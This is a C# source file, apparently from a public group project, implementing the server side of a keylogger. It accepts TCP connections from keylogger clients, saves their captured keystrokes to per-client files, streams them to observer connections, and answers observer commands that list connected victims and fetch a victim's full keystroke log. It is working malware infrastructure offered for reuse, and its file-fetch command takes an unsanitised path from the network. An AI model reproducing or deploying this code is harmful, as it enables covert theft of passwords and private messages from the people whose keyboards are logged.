﻿/*************************************************************************
 *                                                                       *
 *  File:        KeyloggerServer.cs                                      *
 *  Copyright:   (c) 2025, Glavan Pavel, Albu Sorin, Begu Alexandru,     *
 *                         Cojocaru Valentin                             *
 *  Website:     https://github.com/GlavanPavel/Keylogger                *
 *  Description: Implements the main server logic for the keylogger      *
 *               application, handling client connections and data       *
 *               processing.                                             *
 *                                                                       *
 *  This code and information is provided "as is" without warranty of    *
 *  any kind, either expressed or implied, including but not limited     *
 *  to the implied warranties of merchantability or fitness for a        *
 *  particular purpose. You are free to use this source code in your     *
 *  applications as long as the original copyright notice is included.   *
 *                                                                       *
 *************************************************************************/

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using Common;
using System.Runtime.InteropServices;

namespace ServerCore
{
    /// <summary>
    /// Represents a server that handles keylogger clients and observer clients.
    /// </summary>
    public class KeyloggerServer : ISubject
    {
        public readonly List<ClientHandler> _clients = new List<ClientHandler>();
        private readonly List<IObserver> _observers = new List<IObserver>();
        private readonly object _lock = new object();
        private TcpListener _listener;
        public bool _running = false;

        /// <summary>
        /// Starts the server and listens for incoming connections.
        /// </summary>
        /// <param name="cancellationToken">Token to stop the server gracefully.</param>
        /// <returns>A task representing the asynchronous server operation.</returns>
        public async Task RunAsync(CancellationToken cancellationToken = default)
        {
            Console.WriteLine("Starting server on port 5000...");
            Directory.CreateDirectory("SaveData");

            _listener = new TcpListener(IPAddress.Any, 5000);
            _listener.Start();

            _running = true;
            Console.WriteLine("Server is running. Press Ctrl+C to stop...");

            try
            {
                var acceptTask = Task.Run(() => AcceptClientsLoop(), cancellationToken);

                // wait until cancellation requested or server stops
                while (_running && !cancellationToken.IsCancellationRequested)
                {
                    await Task.Delay(1000, cancellationToken);
                }
            }
            catch (OperationCanceledException)
            {
                // expected on cancellation
            }
            finally
            {
                _running = false;
                _listener.Stop();
                Console.WriteLine("Server stopped");
            }
        }



        public async Task StopAsync()
        {
            _running = false;
            _listener?.Stop();

            // stop all clients
            lock (_lock)
            {
                foreach (var client in _clients.ToList())
                {
                    client.TcpClient.Close();
                }
                _clients.Clear();

                foreach (var observer in _observers.ToList())
                {
                    (observer as ObserverClient)?.Close();
                }
                _observers.Clear();
            }

            await Task.CompletedTask;
        }

        /// <summary>
        /// Continuously accepts incoming clients and handles them based on their role (client or observer).
        /// </summary>
        /// <returns>A task representing the asynchronous loop operation.</returns>
        private async Task AcceptClientsLoop()
        {
            while (_running)
            {
                try
                {
                    // wait for a tcp client
                    TcpClient tcpClient = await _listener.AcceptTcpClientAsync();

                    // read the reole of the client
                    string role = await ReadRoleAsync(tcpClient);

                    if (role.Equals("observer", StringComparison.OrdinalIgnoreCase))
                    {
                        var observer = new ObserverClient(tcpClient);
                        lock (_lock) _observers.Add(observer);

                        Console.WriteLine($"Observer registered: {observer.Id}");

                        // start a background task to keep the observer connection alive
                        _ = Task.Run(() => KeepAliveObserver(observer));
                    }
                    else
                    {
                        // standard connection
                        var handler = new ClientHandler
                        {
                            TcpClient = tcpClient,
                            // use the remote endpoint as client ID
                            Id = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).ToString()
                        };

                        lock (_lock) _clients.Add(handler);

                        Console.WriteLine($"Standard client connected: {handler.Id}");

                        // start handling client communication asynchronously
                        _ = HandleClientAsync(handler);
                    }
                }
                catch (Exception ex)
                {
                    var kex = new KeyloggerException("Failed to accept or process incoming client", ex);
                    Console.WriteLine(kex);
                }
            }
        }


        /// <summary>
        /// Reads the initial role string sent by a connected client.
        /// </summary>
        /// <param name="client">The TcpClient to read from.</param>
        /// <returns>A string indicating the role (e.g., "client", "observer").</returns>
        private async Task<string> ReadRoleAsync(TcpClient client)
        {
            var buffer = new byte[10];
            var stream = client.GetStream();
            int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
            return Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim('\0', '\r', '\n', ' ');
        }

        /// <summary>
        /// Handles communication with a connected keylogger client, saving received keystrokes and notifying observers.
        /// </summary>
        /// <param name="handler">The client handler.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        private async Task HandleClientAsync(ClientHandler handler)
        {
            var stream = handler.Stream;
            var buffer = new byte[1024];

            string safeFileName = handler.Id.Replace(":", "_");
            string filePath = Path.Combine("SaveData", safeFileName + ".txt");

            StreamWriter writer = null;

            try
            {
                writer = new StreamWriter(filePath, append: true);

                while (_running && handler.TcpClient.Connected)
                {
                    int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);

                    // 0 indicates the client disconnected
                    if (bytesRead == 0) break;

                    string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    Console.WriteLine($"[{handler.Id}] {message}");

                    // Write the message to file
                    await writer.WriteAsync(message);
                    await writer.FlushAsync(); // Ensure it's saved immediately

                    // notify all observers about this message
                    Notify("[" + handler.Id + "]" + message);
                }
            }
            catch (Exception ex)
            {
                var kex = new KeyloggerException($"Error while handling client {handler.Id}", ex);
                Console.WriteLine(kex);
            }
            finally
            {
                if (writer != null)
                    writer.Dispose();

                Console.WriteLine($"Client disconnected: {handler.Id}");

                handler.TcpClient.Close();

                // remove the client from the list safely
                lock (_lock) _clients.Remove(handler);
            }
        }


        /// <summary>
        /// Keeps an observer client connected and handles special commands like "list" or "getfile".
        /// </summary>
        /// <param name="observer">The observer client.</param>
        /// <returns>A task representing the asynchronous operation.</returns>
        private async Task KeepAliveObserver(IObserver observer)
        {
            try
            {
                var client = observer as ObserverClient;
                var stream = client.Stream;
                var buffer = new byte[1024];

                while (_running && client.TcpClient.Connected)
                {
                    // check if any data is available to read
                    if (stream.DataAvailable)
                    {
                        // read the incoming data from the observer
                        int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                        if (bytesRead == 0)
                            break;

                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                        Console.WriteLine("[Observer " + client.Id + "] Command: " + command);

                        // list: return a list of connected standard clients
                        if (command.Equals("list", StringComparison.OrdinalIgnoreCase))
                        {
                            string response;
                            lock (_lock)
                            {
                                var ids = _clients.Select(c => c.Id);
                                response = "[LIST]" + string.Join("\n", ids);
                            }

                            // send the list of client IDs back to the observer
                            byte[] responseData = Encoding.UTF8.GetBytes(response + "\n");
                            await stream.WriteAsync(responseData, 0, responseData.Length);
                        }
                        // getfile: return the saved file content for that client
                        else if (command.StartsWith("getfile", StringComparison.OrdinalIgnoreCase))
                        {
                            string clientId = command.Substring("getfile".Length).Trim();
                            string safeFileName = clientId.Replace(":", "_");
                            string filePath = Path.Combine("SaveData", safeFileName + ".txt");

                            try
                            {
                                if (File.Exists(filePath))
                                {
                                    // read the file content (even if file is being written to)
                                    string fileContent;
                                    using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                    using (var sr = new StreamReader(fs))
                                    {
                                        fileContent = await sr.ReadToEndAsync();
                                    }

                                    // send the file content to the observer
                                    byte[] response = Encoding.UTF8.GetBytes("[FILE]" + fileContent);
                                    await stream.WriteAsync(response, 0, response.Length);
                                }
                                else
                                {
                                    // notify observer that the file was not found
                                    string errorMsg = "[ERROR]File not found";
                                    byte[] response = Encoding.UTF8.GetBytes(errorMsg);
                                    await stream.WriteAsync(response, 0, response.Length);
                                }
                            }
                            catch (Exception ex)
                            {
                                // wrap and log any error related to reading or sending the file
                                var kex = new KeyloggerException("Error reading or sending file", ex);
                                Console.WriteLine(kex);
                            }
                        }
                    }

                    await Task.Delay(100);
                }
            }
            catch (Exception ex)
            {
                var kex = new KeyloggerException($"Error while keeping observer {observer.Id} alive", ex);
                Console.WriteLine(kex);
            }
            finally
            {
                // clean up observer client on disconnect or error
                Console.WriteLine("Observer disconnected: " + observer.Id);
                lock (_lock) _observers.Remove(observer);
                (observer as ObserverClient)?.Close();
            }
        }


        /// <summary>
        /// Attaches an observer to the notification list.
        /// </summary>
        /// <param name="observer">The observer to attach.</param>
        public void Attach(IObserver observer)
        {
            lock (_lock) _observers.Add(observer);
        }

        /// <summary>
        /// Detaches an observer from the notification list.
        /// </summary>
        /// <param name="observer">The observer to detach.</param>
        public void Detach(IObserver observer)
        {
            lock (_lock) _observers.Remove(observer);
        }

        /// <summary>
        /// Notifies all observers with a new message.
        /// </summary>
        /// <param name="message">The message to send to observers.</param>
        public void Notify(string message)
        {
            lock (_lock)
            {
                foreach (var obs in _observers.ToList())
                {
                    obs.Update(message);
                }
            }
        }
    }
}
